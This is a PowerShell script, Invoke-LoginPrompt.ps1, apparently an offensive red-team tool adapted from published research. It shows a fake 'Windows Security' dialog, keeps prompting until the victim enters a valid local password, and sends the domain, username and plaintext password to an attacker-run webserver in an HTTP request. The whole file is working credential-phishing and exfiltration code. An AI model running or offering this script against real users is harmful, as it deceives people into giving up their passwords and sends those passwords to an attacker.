<#
.SYNOPSIS
Standalone Powershell script that will promp the current user for a valid credentials.
Taken from Matt Nelson (@enigma0x3)

Research links for the following script:
https://enigma0x3.net/mentions/enigma0x3/
https://onedrive.live.com/?authkey=%21ADev0bfQMNxv504&cid=C96A3EEDCE316E4C&id=C96A3EEDCE316E4C%21114&parId=C96A3EEDCE316E4C%21109&o=OneUp#
https://pastebin.com/R8wqMKYP

Simple tweaks added to post results to a webserver - still a bit messy (work in progress)
Have a webserver listening on the target IP (test.php file is not needed), e.g.: python -m SimpleHTTPServer 8080
Filename: Invoke-LoginPrompt.ps1
#>

function Invoke-LoginPrompt{
    $cred = $Host.ui.PromptForCredential("Windows Security", "Please enter user credentials", "$env:userdomain\$env:username","")
    $username = "$env:username"
    $domain = "$env:userdomain"
    $full = "$domain" + "\" + "$username"
    $password = $cred.GetNetworkCredential().password
    Add-Type -assemblyname System.DirectoryServices.AccountManagement
    $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
    while($DS.ValidateCredentials("$full", "$password") -ne $True){
        $cred = $Host.ui.PromptForCredential("Windows Security", "Invalid Credentials, Please try again", "$env:userdomain\$env:username","")
        $username = "$env:username"
        $domain = "$env:userdomain"
        $full = "$domain" + "\" + "$username"
        $password = $cred.GetNetworkCredential().password
        Add-Type -assemblyname System.DirectoryServices.AccountManagement
        $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
        $DS.ValidateCredentials("$full", "$password") | out-null
		Send-Credentials($username, $password, $domain)
        }
}
function Send-Credentials($username, $password, $domain)
{
    $username = [System.Web.HttpUtility]::UrlEncode($username);
    $password = [System.Web.HttpUtility]::UrlEncode($password);
    $domain = [System.Web.HttpUtility]::UrlEncode($domain);
    Invoke-WebRequest -Uri "http://127.0.0.1:8080/test.php?dom=$domain&user=$username&pass=$password"
}
Invoke-LoginPrompt Send-Credentials
